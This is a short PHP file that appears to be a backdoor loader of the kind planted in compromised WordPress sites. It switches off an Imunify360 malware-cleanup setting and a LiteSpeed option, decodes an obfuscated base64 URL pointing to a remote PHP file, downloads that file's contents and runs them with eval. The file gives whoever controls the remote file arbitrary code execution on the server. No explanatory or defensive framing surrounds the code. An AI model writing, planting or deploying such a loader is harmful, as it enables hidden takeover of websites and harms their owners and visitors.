<?php
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);

function get_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    } else {
        $data = file_get_contents($url);
        return $data;
    }
}

$x = '?>';
eval($x . get_data(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzB4RmFaZS9waHBjb2RlL21haW4vd3AtYmxvZ3MtY29tbWVudHMucGhw=')));
?>
